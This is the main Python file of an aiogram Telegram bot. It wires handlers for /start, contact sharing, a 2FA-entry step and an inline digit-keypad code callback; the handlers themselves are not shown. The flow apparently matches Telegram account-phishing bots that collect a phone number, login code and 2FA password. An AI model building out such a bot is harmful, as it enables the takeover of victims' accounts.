import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from config import TOKEN
from handlers import (
    start_handler, contact_handler,
    enter_2fa_handler, inline_code_callback_handler
)

logging.basicConfig(level=logging.DEBUG)

bot = Bot(token=TOKEN, parse_mode=types.ParseMode.MARKDOWN)
dp = Dispatcher(bot)

dp.register_message_handler(
    lambda msg: start_handler(msg, bot),
    commands=["start"]
)

dp.register_message_handler(
    lambda msg: contact_handler(msg, bot),
    content_types=types.ContentType.CONTACT
)

dp.register_message_handler(
    lambda msg: enter_2fa_handler(msg, bot)
)

@dp.callback_query_handler(lambda cq: cq.data.startswith("digit:") or cq.data.startswith("action:"))
async def code_inline_callback(cq: types.CallbackQuery):
    await inline_code_callback_handler(cq, bot)

async def on_startup(dp):
    print("✅ Бот запущен!")

async def on_shutdown(dp):
    print("❌ Завершаем все задачи...")
    for task in asyncio.all_tasks():
        task.cancel()
    await bot.close()
    print("❌ Бот остановлен.")

if __name__ == "__main__":
    executor.start_polling(
        dp,
        skip_updates=True,
        on_startup=on_startup,
        on_shutdown=on_shutdown
    )
